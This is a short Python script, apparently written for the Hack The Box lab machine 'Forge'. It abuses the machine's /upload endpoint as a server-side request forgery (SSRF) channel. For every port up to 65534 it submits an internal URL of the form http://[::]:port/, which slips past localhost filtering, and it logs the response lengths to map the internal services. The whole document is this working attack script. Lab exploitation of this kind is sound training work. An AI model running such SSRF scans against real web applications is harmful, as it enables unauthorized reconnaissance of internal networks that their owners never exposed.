import requests

url = 'http://forge.htb/upload'
header = {'Content-Type':'application/x-www-form-urlencoded','Content-Length':'43'}

for i in range(1,65535):
    body = f'url=http://[::]:{i}/&remote=1'
    res = requests.post(url,headers=header,data=body)
    print(f'port: {i}\nlength: {len(res.content)}')
    with open('res.txt','a+') as f:
        f.write(f'port: {i}\nlength: {len(res.content)}\n')
